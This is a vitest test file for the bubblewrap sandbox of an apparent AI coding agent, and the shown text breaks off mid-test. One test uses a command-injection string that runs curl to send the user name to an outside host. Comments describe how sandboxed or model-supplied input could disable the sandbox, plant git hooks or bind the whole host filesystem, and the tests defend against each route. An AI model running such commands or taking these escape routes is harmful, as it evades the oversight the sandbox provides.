import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { execFileSync } from 'child_process';
import {
  existsSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  rmSync,
  symlinkSync,
  writeFileSync,
} from 'fs';
import { homedir, tmpdir } from 'os';
import { basename, join, posix, resolve, win32 } from 'path';
import {
  buildSandboxExecution,
  createSandbox,
  matchesExcludedCommand,
  realSandboxHost,
  sandboxBackendAvailable,
  sandboxCoverage,
  sandboxPolicySummary,
  unbindablePaths,
  unsandboxedRefusalMessage,
  withGitConfigReadOnlyNotice,
  type SandboxEntryKind,
  type SandboxHost,
} from './sandbox.js';
import { DEFAULT_SETTINGS, type ResolvedSettings } from './settings.js';

function sandboxSettings(
  overrides: Partial<ResolvedSettings['sandbox']> = {},
): ResolvedSettings['sandbox'] {
  return { ...structuredClone(DEFAULT_SETTINGS.sandbox), enabled: true, ...overrides };
}

/** The system directories `buildSandboxExecution` binds read-only, named literally. */
const SYSTEM_MOUNTS = ['/usr', '/lib', '/lib64', '/bin', '/sbin', '/etc', '/opt'];

/**
 * A fully injected host on which every path "exists": the generated argv
 * depends only on the code under test, never on which system directories the
 * machine running the suite happens to have. Without this, an assertion that
 * `/usr` is bound holds on Linux and silently asserts on an empty bind list on
 * Windows CI, where `resolve('/usr')` lands on `C:\usr` and nothing is there.
 */
function allExistingHost(flavour: typeof posix | typeof win32): SandboxHost {
  return {
    path: flavour,
    exists: () => true,
    isDirectory: () => true,
    readFile: () => null,
    readDir: () => [],
    entryKind: () => 'directory',
    linkTarget: () => null,
    realpath: (at: string) => at,
    homedir: () => (flavour === win32 ? 'C:\\Users\\book' : '/home/book'),
  };
}

describe('buildSandboxExecution', () => {
  it('passes the command as a single argv element so no outer shell can parse it', () => {
    const command = 'echo hi; touch /tmp/escaped && curl $(whoami).example.com';
    const exec = buildSandboxExecution('/usr/bin/bwrap', command, '/work', sandboxSettings());

    expect(exec.file).toBe('/usr/bin/bwrap');
    // Everything the user wrote lives in exactly one element, at the end.
    expect(exec.args.at(-1)).toBe(command);
    expect(exec.args.filter((arg) => arg.includes(';'))).toEqual([command]);
    expect(exec.args.slice(-3)).toEqual(['/bin/bash', '-c', command]);
    expect(exec.args.at(-4)).toBe('--');
  });

  it('binds the workspace after the /tmp tmpfs so a workspace under /tmp survives', () => {
    const dir = mkdtempSync(join(tmpdir(), 'book-sbx-order-'));
    try {
      const exec = buildSandboxExecution('/usr/bin/bwrap', 'true', dir, sandboxSettings());
      const tmpfsIndex = exec.args.indexOf('--tmpfs');
      const bindIndex = exec.args.indexOf(dir);
      expect(tmpfsIndex).toBeGreaterThan(-1);
      expect(bindIndex).toBeGreaterThan(tmpfsIndex);
      expect(exec.args[bindIndex - 1]).toBe('--bind');
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it.each([
    { flavourName: 'posix', flavour: posix, workspace: '/work' },
    { flavourName: 'win32', flavour: win32, workspace: 'C:\\work' },
  ])(
    'binds the workspace after the system read-only mounts ($flavourName paths)',
    ({ flavour, workspace }) => {
      const exec = buildSandboxExecution(
        '/usr/bin/bwrap',
        'true',
        workspace,
        sandboxSettings(),
        allExistingHost(flavour),
      );
      // The system mounts are the ones named literally, and they must precede
      // the writable workspace bind or a workspace under /usr would be
      // shadowed. The workspace control files are the deliberate exception and
      // come after; they are asserted in their own suite below.
      const systemSources = new Set(SYSTEM_MOUNTS.map((dir) => flavour.resolve(dir)));
      const systemBind = exec.args.findIndex(
        (arg, index) => arg === '--ro-bind' && systemSources.has(exec.args[index + 1]),
      );
      // Found by what it binds rather than by being the last `--bind`: a git
      // directory is pinned with one after this point, and it is the *workspace*
      // that has to come after the system mounts.
      const bindIndex = exec.args.findIndex(
        (arg, index) => arg === '--bind' && exec.args[index + 1] === flavour.resolve(workspace),
      );
      // Both mounts must actually be present before their order means anything:
      // -1 > -1 would vacuously "order" two lookups that found nothing.
      expect(systemBind).toBeGreaterThan(-1);
      expect(bindIndex).toBeGreaterThan(systemBind);
    },
  );

  it('still binds the workspace when no POSIX system mount exists (the Windows host shape)', () => {
    // A Windows host is exactly this: /usr, /lib, … resolve onto the current
    // drive and none exist, so every system read-only bind is skipped. The
    // workspace bind must survive that on its own.
    const workspace = 'C:\\work';
    const host: SandboxHost = {
      ...allExistingHost(win32),
      exists: (path) => path === workspace,
    };
    const exec = buildSandboxExecution(
      '/usr/bin/bwrap',
      'true',
      workspace,
      sandboxSettings(),
      host,
    );
    // No *system* read-only mount, which is what this host shape means. The
    // control files still produce their own (the git directory this host claims
    // exists is pinned and its hooks bound), and they are not what this is about.
    const systemSources = new Set(SYSTEM_MOUNTS.map((dir) => win32.resolve(dir)));
    expect(
      exec.args.findIndex(
        (arg, index) => arg === '--ro-bind' && systemSources.has(exec.args[index + 1]),
      ),
    ).toBe(-1);
    const bindIndex = exec.args.indexOf('--bind');
    expect(bindIndex).toBeGreaterThan(-1);
    expect(exec.args.slice(bindIndex, bindIndex + 3)).toEqual(['--bind', workspace, workspace]);
  });

  it('shares the network only when no domain policy is declared', () => {
    const open = buildSandboxExecution('/usr/bin/bwrap', 'true', '/work', sandboxSettings());
    expect(open.args).toContain('--share-net');
    expect(open.args).not.toContain('--unshare-net');
  });

  it('fails closed to no network when a per-domain policy is declared', () => {
    // bubblewrap has no DNS or domain awareness, so an allow-list cannot be
    // honoured as written; handing over the full host network would be worse.
    const settings = sandboxSettings();
    settings.network.allowedDomains = ['github.com'];
    const exec = buildSandboxExecution('/usr/bin/bwrap', 'true', '/work', settings);
    expect(exec.args).toContain('--unshare-net');
    expect(exec.args).not.toContain('--share-net');

    const denied = sandboxSettings();
    denied.network.deniedDomains = ['evil.example'];
    expect(buildSandboxExecution('/usr/bin/bwrap', 'true', '/work', denied).args).toContain(
      '--unshare-net',
    );
  });

  it('applies declared filesystem policy after the workspace bind', () => {
    const writable = mkdtempSync(join(tmpdir(), 'book-sbx-rw-'));
    const readonly = mkdtempSync(join(tmpdir(), 'book-sbx-ro-'));
    const masked = mkdtempSync(join(tmpdir(), 'book-sbx-hide-'));
    try {
      const settings = sandboxSettings();
      settings.filesystem.allowWrite = [writable];
      settings.filesystem.denyWrite = [readonly];
      settings.filesystem.denyRead = [masked];
      const exec = buildSandboxExecution('/usr/bin/bwrap', 'true', '/work', settings);

      expect(exec.args[exec.args.indexOf(writable) - 1]).toBe('--bind');
      expect(exec.args[exec.args.indexOf(readonly) - 1]).toBe('--ro-bind');
      expect(exec.args[exec.args.indexOf(masked) - 1]).toBe('--tmpfs');
    } finally {
      for (const dir of [writable, readonly, masked]) {
        rmSync(dir, { recursive: true, force: true });
      }
    }
  });

  it('skips bind sources that do not exist, which bwrap would reject', () => {
    const settings = sandboxSettings();
    settings.filesystem.allowWrite = ['/definitely/not/a/real/path'];
    const exec = buildSandboxExecution('/usr/bin/bwrap', 'true', '/work', settings);
    expect(exec.args).not.toContain('/definitely/not/a/real/path');
  });

  it('drops capabilities and ties the sandbox lifetime to the spawning process', () => {
    const exec = buildSandboxExecution('/usr/bin/bwrap', 'true', '/work', sandboxSettings());
    expect(exec.args.join(' ')).toContain('--cap-drop ALL');
    expect(exec.args).toContain('--die-with-parent');
  });

  it('never uses --new-session, which would break every process-group kill', () => {
    // bwrap calls setsid() under --new-session, moving the sandboxed tree out
    // of the process group Node created with `detached: true`. KillShell, the
    // foreground timeout, and Ctrl-C all signal that group and confirm death
    // with kill(-pgid, 0), so the group would read as empty while the command
    // kept running.
    const exec = buildSandboxExecution('/usr/bin/bwrap', 'true', '/work', sandboxSettings());
    expect(exec.args).not.toContain('--new-session');
  });

  it('masks a denied file with /dev/null instead of a tmpfs that would abort bwrap', () => {
    // --tmpfs mkdirs its target, so pointing it at a file fails the whole
    // invocation with "Not a directory" — and a credentials file is the most
    // natural thing to put in denyRead.
    const dir = mkdtempSync(join(tmpdir(), 'book-sbx-file-'));
    const file = join(dir, 'creds.txt');
    writeFileSync(file, 'secret');
    try {
      const settings = sandboxSettings();
      settings.filesystem.denyRead = [file, dir];
      const exec = buildSandboxExecution('/usr/bin/bwrap', 'true', '/work', settings);

      const fileIndex = exec.args.indexOf(file);
      expect(exec.args[fileIndex - 1]).toBe('/dev/null');
      expect(exec.args[fileIndex - 2]).toBe('--ro-bind');
      // A directory still gets the tmpfs mask.
      expect(exec.args[exec.args.indexOf(dir) - 1]).toBe('--tmpfs');
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it('expands ~ in configured filesystem paths', () => {
    const settings = sandboxSettings();
    settings.filesystem.denyWrite = ['~'];
    const exec = buildSandboxExecution('/usr/bin/bwrap', 'true', '/work', settings);
    // Without expansion this resolves to "<cwd>/~", which does not exist and
    // would be dropped — unenforced policy the user believes is active.
    expect(exec.args).toContain(homedir());
    expect(exec.args).not.toContain(resolve('~'));
  });

  it('binds the workspace root, never a caller-supplied working directory', () => {
    // `workdir` is a model-supplied Bash argument. Binding it would let the
    // model widen its own sandbox: `--bind / /` emitted last shadows every
    // other mount and returns the whole host filesystem, read-write.
    const exec = buildSandboxExecution('/usr/bin/bwrap', 'true', '/work', sandboxSettings());
    expect(exec.args.filter((arg) => arg === '/')).toHaveLength(0);
  });
});

/**
 * The workspace bind is read-write, which made every workspace control file
 * writable from inside the sandbox: a sandboxed command could write
 * `.book/settings.local.json` (honoured on the host from the next session — it
 * can disable the sandbox or add `Bash(*)`), drop a `.git/hooks/*` script, or
 * point `core.hooksPath` / `core.fsmonitor` in `.git/config`, all of which the
 * *host* runs afterwards. The file tools already refuse `.book/settings.local.json`
 * (permissions.ts); the sandbox did not (#373).
 */
describe('buildSandboxExecution workspace control files', () => {
  const WORKSPACE = '/work';

  /**
   * A host whose filesystem is a declared set of paths, so each case is about
   * the mount the code emits rather than about a temp directory on this machine.
   */
  function hostWith(
    paths: Record<string, 'dir' | 'file' | 'symlink'>,
    files: Record<string, string> = {},
    links: Record<string, string> = {},
  ) {
    const real = new Set(Object.keys(paths));
    const kind = (path: string): SandboxEntryKind | null =>
      paths[path] === 'dir' ? 'directory' : (paths[path] ?? null);
    return {
      path: posix,
      exists: (path: string) => real.has(path),
      isDirectory: (path: string) => paths[path] === 'dir',
      homedir: () => '/home/book',
      readFile: (path: string) => files[path] ?? null,
      // A declared tree has no listings of its own; entry names are the
      // declared children of a directory, which is all the git-dir walk reads.
      readDir: (path: string) =>
        [...real]
          .filter((candidate) => posix.dirname(candidate) === path)
          .map((candidate) => posix.basename(candidate)),
      entryKind: kind,
      linkTarget: (path: string) => links[path] ?? null,
      realpath: (path: string) => (real.has(path) ? path : null),
    } satisfies SandboxHost;
  }

  function mountsFor(args: string[], target: string): { flag: string; index: number } {
    const index = args.indexOf(target);
    return { flag: index === -1 ? '' : args[index - 1], index };
  }

  /**
   * The last mount of `target`, for a path the namespace mounts more than once.
   *
   * The later one is the one in force: a protected path is bound read-only and
   * then, if the user asked for it, bound read-write over the top.
   */
  function lastMountFor(args: string[], target: string): { flag: string; index: number } {
    let found = { flag: '', index: -1 };
    args.forEach((arg, index) => {
      if (arg.startsWith('-') && args[index + 1] === target) found = { flag: arg, index };
    });
    return found;
  }

  it('mounts an existing .book read-only after the workspace and any allowWrite bind', () => {
    const host = hostWith({
      '/work': 'dir',
      '/work/.book': 'dir',
      '/work/extra': 'dir',
      '/work/.git': 'dir',
      '/work/.git/hooks': 'dir',
      '/work/.git/config': 'file',
    });
    const settings = sandboxSettings();
    settings.filesystem.allowWrite = ['/work/extra'];

    const exec = buildSandboxExecution('/usr/bin/bwrap', 'true', WORKSPACE, settings, host);

    const book = mountsFor(exec.args, '/work/.book');
    expect(exec.args.slice(book.index - 1, book.index + 2)).toEqual([
      '--ro-bind',
      '/work/.book',
      '/work/.book',
    ]);
    // After the workspace bind, or the workspace would shadow it.
    expect(exec.args.lastIndexOf('--bind', book.index)).toBeLessThan(book.index);
    // After `allowWrite`, or an extra writable root would reopen it.
    expect(exec.args.indexOf('/work/extra')).toBeLessThan(book.index);
    // Before the configured deny policy, which stays free to be stricter.
    expect(book.index).toBeLessThan(exec.args.indexOf('--share-net'));
  });

  it('mounts an absent .book as an empty read-only directory so it cannot be created', () => {
    const host = hostWith({ '/work': 'dir' });

    const exec = buildSandboxExecution(
      '/usr/bin/bwrap',
      'true',
      WORKSPACE,
      sandboxSettings(),
      host,
    );

    const bookIndex = exec.args.indexOf('/work/.book');
    expect(exec.args.slice(bookIndex - 1, bookIndex + 3)).toEqual([
      '--tmpfs',
      '/work/.book',
      '--remount-ro',
      '/work/.book',
    ]);
  });

  it('mounts a git directory hooks and config read-only', () => {
    const host = hostWith({
      '/work': 'dir',
      '/work/.book': 'dir',
      '/work/.git': 'dir',
      '/work/.git/hooks': 'dir',
      '/work/.git/config': 'file',
    });

    const exec = buildSandboxExecution(
      '/usr/bin/bwrap',
      'true',
      WORKSPACE,
      sandboxSettings(),
      host,
    );

    expect(mountsFor(exec.args, '/work/.git/hooks').flag).toBe('--ro-bind');
    expect(mountsFor(exec.args, '/work/.git/config').flag).toBe('--ro-bind');
    // An absent config is not mounted: there is nothing to protect, and bwrap
    // aborts the whole invocation on a missing bind source.
    expect(exec.args).not.toContain('/work/.git/config.worktree');
  });

  it('masks an absent hooks directory so one cannot be created', () => {
    const host = hostWith({ '/work': 'dir', '/work/.book': 'dir', '/work/.git': 'dir' });

    const exec = buildSandboxExecution(
      '/usr/bin/bwrap',
      'true',
      WORKSPACE,
      sandboxSettings(),
      host,
    );

    const hooksIndex = exec.args.indexOf('/work/.git/hooks');
    expect(exec.args.slice(hooksIndex - 1, hooksIndex + 2)).toEqual([
      '--tmpfs',
      '/work/.git/hooks',
      '--remount-ro',
    ]);
  });

  it('follows a .git file to the git dir inside the workspace, and its commondir', () => {
    const host = hostWith(
      {
        '/work': 'dir',
        '/work/.book': 'dir',
        '/work/.git': 'file',
        '/work/.git-data': 'dir',
        '/work/.git-data/hooks': 'dir',
        '/work/.git-data/config.worktree': 'file',
        '/work/.git-shared': 'dir',
        '/work/.git-shared/hooks': 'dir',
        '/work/.git-shared/config': 'file',
      },
      {
        '/work/.git': 'gitdir: .git-data\n',
        // commondir is relative to the git dir, not to the workspace.
        '/work/.git-data/commondir': '../.git-shared\n',
      },
    );

    const exec = buildSandboxExecution(
      '/usr/bin/bwrap',
      'true',
      WORKSPACE,
      sandboxSettings(),
      host,
    );

    for (const target of [
      '/work/.git-data/hooks',
      '/work/.git-data/config.worktree',
      '/work/.git-shared/hooks',
      '/work/.git-shared/config',
    ]) {
      expect(mountsFor(exec.args, target).flag).toBe('--ro-bind');
    }
  });

  it('does not touch a git dir that lies outside the workspace', () => {
    // Nothing binds it writable, so there is nothing to protect — and mounting
    // it would hand a worktree's hooks to a command that has no other business
    // seeing the parent repository.
    const host = hostWith(
      {
        '/work': 'dir',
        '/work/.book': 'dir',
        '/work/.git': 'file',
        '/elsewhere/repo.git': 'dir',
        '/elsewhere/repo.git/hooks': 'dir',
        '/elsewhere/repo.git/config': 'file',
      },
      { '/work/.git': 'gitdir: /elsewhere/repo.git\n' },
    );

    const exec = buildSandboxExecution(
      '/usr/bin/bwrap',
      'true',
      WORKSPACE,
      sandboxSettings(),
      host,
    );

    expect(exec.args.join(' ')).not.toContain('/elsewhere/repo.git');
    // The `.git` file itself is still a control file the host reads, so it is
    // read-only: a command that could rewrite it would point the host's git at a
    // repository it built, whose hooks and config it then owns (#373).
    expect(mountsFor(exec.args, '/work/.git').flag).toBe('--ro-bind');
  });

  it('resolves a relative gitdir against the workspace, as git does', () => {
    const host = hostWith(
      {
        '/work': 'dir',
        '/work/.book': 'dir',
        '/work/.git': 'file',
        '/work/nested/gitdir': 'dir',
        '/work/nested/gitdir/hooks': 'dir',
      },
      { '/work/.git': 'gitdir: nested/gitdir' },
    );

    const exec = buildSandboxExecution(
      '/usr/bin/bwrap',
      'true',
      WORKSPACE,
      sandboxSettings(),
      host,
    );

    expect(mountsFor(exec.args, '/work/nested/gitdir/hooks').flag).toBe('--ro-bind');
  });

  it('mounts no git metadata when the workspace is not a repository', () => {
    const host = hostWith({ '/work': 'dir', '/work/.book': 'dir' });

    const exec = buildSandboxExecution(
      '/usr/bin/bwrap',
      'true',
      WORKSPACE,
      sandboxSettings(),
      host,
    );

    expect(exec.args.join(' ')).not.toContain('.git');
  });

  it('ignores a .git file it cannot parse', () => {
    const host = hostWith(
      { '/work': 'dir', '/work/.book': 'dir', '/work/.git': 'file' },
      { '/work/.git': 'not a gitdir line\n' },
    );

    const exec = buildSandboxExecution(
      '/usr/bin/bwrap',
      'true',
      WORKSPACE,
      sandboxSettings(),
      host,
    );

    // The file itself is read-only, but no git directory is taken from it.
    expect(exec.args.join(' ')).not.toContain('.git/');
  });

  /**
   * Read-only *children* of a git dir were not enough, because the file that
   * *selects* the git dir stayed writable: a sandboxed command repointed `.git`
   * or `commondir` at a repository it built, planted hooks and `core.hooksPath`
   * there, and the host's next `git commit` ran them. Every case below was
   * reproduced against a real bubblewrap (see the real-sandbox suite).
   */
  describe('git pointer files', () => {
    it('pins the git directory as a mount point so it cannot be renamed away', () => {
      // rename(2) on a path that is not a mount point succeeds, so a read-only
      // `hooks/` inside a writable `.git` is not protection: `mv .git .git.old`
      // moves the whole thing, hook and all, and a fresh writable one takes its
      // place. `--bind <dir> <dir>` is what makes the rename EBUSY.
      const host = hostWith({
        '/work': 'dir',
        '/work/.book': 'dir',
        '/work/.git': 'dir',
        '/work/.git/hooks': 'dir',
        '/work/.git/config': 'file',
      });

      const exec = buildSandboxExecution(
        '/usr/bin/bwrap',
        'true',
        WORKSPACE,
        sandboxSettings(),
        host,
      );

      const pin = mountsFor(exec.args, '/work/.git');
      expect(exec.args.slice(pin.index - 1, pin.index + 2)).toEqual([
        '--bind',
        '/work/.git',
        '/work/.git',
      ]);
      // Writable, so a sandboxed `git commit` still works...
      expect(pin.flag).toBe('--bind');
      // ...and before the read-only children, which are mounted into it.
      expect(pin.index).toBeLessThan(mountsFor(exec.args, '/work/.git/hooks').index);
      expect(pin.index).toBeLessThan(mountsFor(exec.args, '/work/.git/config').index);
      // And after the workspace bind, which it lives inside.
      const workspace = exec.args.findIndex(
        (arg, index) => arg === '--bind' && exec.args[index + 1] === WORKSPACE,
      );
      expect(workspace).toBeGreaterThan(-1);
      expect(workspace).toBeLessThan(pin.index);
    });

    it('protects the commondir and gitdir pointer files a linked worktree writes', () => {
      // `.git/worktrees/<wt>/commondir` names the shared git dir, and
      // `.git/worktrees/<wt>/gitdir` names the work tree. Either rewritten, the
      // host's git is pointed at a git dir the command built.
      const host = hostWith({
        '/work': 'dir',
        '/work/.book': 'dir',
        '/work/.git': 'dir',
        '/work/.git/hooks': 'dir',
        '/work/.git/config': 'file',
        '/work/.git/worktrees/wt': 'dir',
        '/work/.git/worktrees/wt/hooks': 'dir',
        '/work/.git/worktrees/wt/config.worktree': 'file',
        '/work/.git/worktrees/wt/commondir': 'file',
        '/work/.git/worktrees/wt/gitdir': 'file',
      });

      const exec = buildSandboxExecution(
        '/usr/bin/bwrap',
        'true',
        WORKSPACE,
        sandboxSettings(),
        host,
      );

      for (const target of [
        '/work/.git/worktrees/wt/hooks',
        '/work/.git/worktrees/wt/config.worktree',
        '/work/.git/worktrees/wt/commondir',
        '/work/.git/worktrees/wt/gitdir',
      ]) {
        expect(mountsFor(exec.args, target).flag, target).toBe('--ro-bind');
      }
    });

    it('protects a submodule git dir, and the modules of a submodule', () => {
      // `.git/modules/<sub>` is a git dir in its own right, and it was never
      // mounted at all: a hook planted in it ran on the host's next
      // `git -C sub commit`. A submodule of a submodule nests again, so the walk
      // is not one level deep.
      const host = hostWith({
        '/work': 'dir',
        '/work/.book': 'dir',
        '/work/.git': 'dir',
        '/work/.git/hooks': 'dir',
        '/work/.git/modules/sub': 'dir',
        '/work/.git/modules/sub/hooks': 'dir',
        '/work/.git/modules/sub/config': 'file',
        '/work/.git/modules/sub/modules/deep': 'dir',
        '/work/.git/modules/sub/modules/deep/hooks': 'dir',
        '/work/.git/modules/sub/modules/deep/config': 'file',
      });

      const exec = buildSandboxExecution(
        '/usr/bin/bwrap',
        'true',
        WORKSPACE,
        sandboxSettings(),
        host,
      );

      for (const target of [
        '/work/.git/modules/sub/hooks',
        '/work/.git/modules/sub/config',
        '/work/.git/modules/sub/modules/deep/hooks',
        '/work/.git/modules/sub/modules/deep/config',
      ]) {
        expect(mountsFor(exec.args, target).flag, target).toBe('--ro-bind');
      }
    });

    it('protects the hooks directory core.hooksPath names inside the workspace', () => {
      // husky v9 does exactly this: `core.hooksPath = .husky/_`. The git dir's
      // own `hooks/` is read-only, but the directory git would actually run
      // hooks from was left writable, so a config this namespace protects was a
      // hooks directory it never looked at.
      const host = hostWith(
        {
          '/work': 'dir',
          '/work/.book': 'dir',
          '/work/.git': 'dir',
          '/work/.git/hooks': 'dir',
          '/work/.git/config': 'file',
          '/work/.husky/_': 'dir',
        },
        { '/work/.git/config': '[core]\n\thooksPath = .husky/_\n' },
      );

      const exec = buildSandboxExecution(
        '/usr/bin/bwrap',
        'true',
        WORKSPACE,
        sandboxSettings(),
        host,
      );

      expect(mountsFor(exec.args, '/work/.husky/_').flag).toBe('--ro-bind');
    });

    it('masks a hooksPath inside the workspace that does not exist yet', () => {
      const host = hostWith(
        {
          '/work': 'dir',
          '/work/.book': 'dir',
          '/work/.git': 'dir',
          '/work/.git/hooks': 'dir',
          '/work/.git/config': 'file',
        },
        { '/work/.git/config': '[core]\n\thooksPath = .husky\n' },
      );

      const exec = buildSandboxExecution(
        '/usr/bin/bwrap',
        'true',
        WORKSPACE,
        sandboxSettings(),
        host,
      );

      const husky = mountsFor(exec.args, '/work/.husky');
      expect(husky.flag).toBe('--tmpfs');
      expect(exec.args.slice(husky.index - 1, husky.index + 2)).toEqual([
        '--tmpfs',
        '/work/.husky',
        '--remount-ro',
      ]);
    });

    it('leaves a hooksPath outside the workspace alone', () => {
      // Nothing binds it writable, so there is nothing to protect, and mounting
      // it would show a sandboxed command another repository's hooks.
      const host = hostWith(
        {
          '/work': 'dir',
          '/work/.book': 'dir',
          '/work/.git': 'dir',
          '/work/.git/hooks': 'dir',
          '/work/.git/config': 'file',
        },
        { '/work/.git/config': '[core]\n\thooksPath = /home/book/.hooks\n' },
      );

      const exec = buildSandboxExecution(
        '/usr/bin/bwrap',
        'true',
        WORKSPACE,
        sandboxSettings(),
        host,
      );

      expect(exec.args.join(' ')).not.toContain('/home/book/.hooks');
    });

    it('reads hooksPath out of config.worktree too, and only from [core]', () => {
      const linked = hostWith(
        {
          '/work': 'dir',
          '/work/.book': 'dir',
          '/work/.git': 'file',
          '/work/.git-data': 'dir',
          '/work/.git-data/hooks': 'dir',
          '/work/.git-data/config.worktree': 'file',
        },
        {
          '/work/.git': 'gitdir: .git-data\n',
          '/work/.git-data/config.worktree':
            '[core]\n\thooksPath = .husky\n[other "x"]\n\thookspath = .decoy\n',
        },
      );

      const exec = buildSandboxExecution(
        '/usr/bin/bwrap',
        'true',
        WORKSPACE,
        sandboxSettings(),
        linked,
      );

      // `config.worktree` belongs to the linked worktree, whose work tree root
      // the `gitdir` file names — here the workspace itself.
      expect(mountsFor(exec.args, '/work/.husky').flag).toBe('--tmpfs');
      expect(exec.args.join(' ')).not.toContain('.decoy');
    });

    it('ignores a gitdir or commondir that names a plain file', () => {
      // The pointer text is workspace-controlled. `<file>/hooks` is not a
      // directory bubblewrap can mount, and it aborts the whole invocation with
      // "Not a directory" — so a sandboxed command could break every later
      // sandboxed command just by writing that one pointer.
      const host = hostWith(
        {
          '/work': 'dir',
          '/work/.book': 'dir',
          '/work/.git': 'file',
          '/work/not-a-dir': 'file',
        },
        { '/work/.git': 'gitdir: not-a-dir\n' },
      );

      const exec = buildSandboxExecution(
        '/usr/bin/bwrap',
        'true',
        WORKSPACE,
        sandboxSettings(),
        host,
      );

      expect(exec.args.join(' ')).not.toContain('not-a-dir/');
    });

    it('treats a git dir whose name merely starts with .. as inside the workspace', () => {
      // The old check was lexical — `relative.startsWith('..')` — so a directory
      // called `..meta` read as being outside its own workspace and went
      // unprotected. Containment is `isOutside` now, which only a real parent
      // step satisfies.
      const host = hostWith(
        {
          '/work': 'dir',
          '/work/.book': 'dir',
          '/work/.git': 'file',
          '/work/..meta/gitdir': 'dir',
          '/work/..meta/gitdir/hooks': 'dir',
        },
        { '/work/.git': 'gitdir: ..meta/gitdir\n' },
      );

      const exec = buildSandboxExecution(
        '/usr/bin/bwrap',
        'true',
        WORKSPACE,
        sandboxSettings(),
        host,
      );

      expect(mountsFor(exec.args, '/work/..meta/gitdir/hooks').flag).toBe('--ro-bind');
    });
  });

  /**
   * `.book` is a file a repository can ship as a symlink, and bubblewrap aborts
   * the whole invocation on either shape — `--tmpfs` cannot mkdir through a
   * dangling link, and a link to a directory is "Can't bind mount". A clone could
   * therefore break every sandboxed command in the workspace.
   */
  describe('control paths that are symlinks', () => {
    it('protects the target of a symlinked control directory', () => {
      const host = hostWith(
        { '/work': 'dir', '/work/.book': 'symlink', '/work/.book-real': 'dir' },
        {},
        { '/work/.book': '.book-real' },
      );

      const exec = buildSandboxExecution(
        '/usr/bin/bwrap',
        'true',
        WORKSPACE,
        sandboxSettings(),
        host,
      );

      // The host reads the settings through the link, so the link's target is
      // the path that has to be read-only.
      expect(mountsFor(exec.args, '/work/.book-real').flag).toBe('--ro-bind');
    });

    it('masks a dangling link target inside the workspace instead of aborting bwrap', () => {
      const host = hostWith(
        { '/work': 'dir', '/work/.book': 'symlink' },
        {},
        {
          '/work/.book': '.book-real',
        },
      );

      const exec = buildSandboxExecution(
        '/usr/bin/bwrap',
        'true',
        WORKSPACE,
        sandboxSettings(),
        host,
      );

      // `--tmpfs` on the link path would be "Can't bind mount"; on the target it
      // is a mask, and creating the target inside the namespace fails.
      expect(exec.args.join(' ')).not.toContain('--tmpfs /work/.book ');
      const masked = mountsFor(exec.args, '/work/.book-real');
      expect(masked.flag).toBe('--tmpfs');
      expect(exec.args.slice(masked.index - 1, masked.index + 2)).toEqual([
        '--tmpfs',
        '/work/.book-real',
        '--remount-ro',
      ]);
    });

    it('skips a symlinked control path whose target is outside the workspace', () => {
      // Nothing binds that directory writable, so there is nothing to protect,
      // and a mount for it would be a path the namespace has no other business
      // knowing about.
      const host = hostWith(
        { '/work': 'dir', '/work/.book': 'symlink' },
        {},
        {
          '/work/.book': '/home/book/shared',
        },
      );

      const exec = buildSandboxExecution(
        '/usr/bin/bwrap',
        'true',
        WORKSPACE,
        sandboxSettings(),
        host,
      );

      expect(exec.args.join(' ')).not.toContain('/home/book/shared');
      // The workspace bind is untouched, so the command still runs.
      expect(exec.args).toContain('--share-net');
    });

    it('skips a control path that is neither a file nor a directory', () => {
      // A FIFO, a socket or a device has no mount bwrap can make over it, and
      // passing one aborts the invocation. Nothing to protect, so nothing is
      // emitted and the command runs.
      const host = hostWith({
        '/work': 'dir',
        '/work/.book': 'fifo',
        '/work/.git': 'dir',
        '/work/.git/hooks': 'dir',
      } as unknown as Record<string, 'dir' | 'file' | 'symlink'>);

      const exec = buildSandboxExecution(
        '/usr/bin/bwrap',
        'true',
        WORKSPACE,
        sandboxSettings(),
        host,
      );

      expect(exec.args.join(' ')).not.toContain('/work/.book');
      // The rest of the protections are still there.
      expect(mountsFor(exec.args, '/work/.git/hooks').flag).toBe('--ro-bind');
    });
  });

  /**
   * `.book/settings.local.json` is the file a user puts a provider key in, and
   * the namespace shares the host network — so read-only is not enough, the
   * contents have to be unreadable inside it.
   */
  describe('settings.local.json and the legacy rc file', () => {
    it('masks an existing settings.local.json after the .book bind', () => {
      const host = hostWith({
        '/work': 'dir',
        '/work/.book': 'dir',
        '/work/.book/settings.local.json': 'file',
      });

      const exec = buildSandboxExecution(
        '/usr/bin/bwrap',
        'true',
        WORKSPACE,
        sandboxSettings(),
        host,
      );

      const index = exec.args.indexOf('/work/.book/settings.local.json');
      expect(exec.args[index - 2]).toBe('--ro-bind');
      expect(exec.args[index - 1]).toBe('/dev/null');
      // After the directory bind, or the mask would be mounted under nothing.
      expect(index).toBeGreaterThan(mountsFor(exec.args, '/work/.book').index);
    });

    it('binds an existing .bookrc.json read-only', () => {
      // The host reads the legacy file on the next launch, and its `baseUrl`
      // wins over every settings layer (src/config.ts).
      const host = hostWith({
        '/work': 'dir',
        '/work/.book': 'dir',
        '/work/.bookrc.json': 'file',
      });

      const exec = buildSandboxExecution(
        '/usr/bin/bwrap',
        'true',
        WORKSPACE,
        sandboxSettings(),
        host,
      );

      expect(mountsFor(exec.args, '/work/.bookrc.json').flag).toBe('--ro-bind');
    });

    it('mounts neither when neither exists', () => {
      const host = hostWith({ '/work': 'dir' });

      const exec = buildSandboxExecution(
        '/usr/bin/bwrap',
        'true',
        WORKSPACE,
        sandboxSettings(),
        host,
      );

      // A file cannot be masked (bwrap rejects a tmpfs over a file path), so an
      // absent one is simply not mounted.
      expect(exec.args).not.toContain('/work/.bookrc.json');
      expect(exec.args).not.toContain('/work/.book/settings.local.json');
    });
  });

  /**
   * A user who genuinely needs to write inside a protected path — a hook
   * installer writing `.git/hooks/pre-commit`, a cache under `.book/cache` —
   * could not, because the protected mounts were emitted after every
   * `allowWrite` bind and shadowed them.
   */
  describe('allowWrite over a protected path', () => {
    const host = () =>
      hostWith({
        '/work': 'dir',
        '/work/.book': 'dir',
        '/work/.book/cache': 'dir',
        '/work/.git': 'dir',
        '/work/.git/hooks': 'dir',
        '/work/.git/config': 'file',
      });

    it('applies an entry at or under a protected path after it, so the opt-in wins', () => {
      const settings = sandboxSettings();
      settings.filesystem.allowWrite = ['/work/.book/cache', '/work/.git/hooks'];

      const exec = buildSandboxExecution('/usr/bin/bwrap', 'true', WORKSPACE, settings, host());

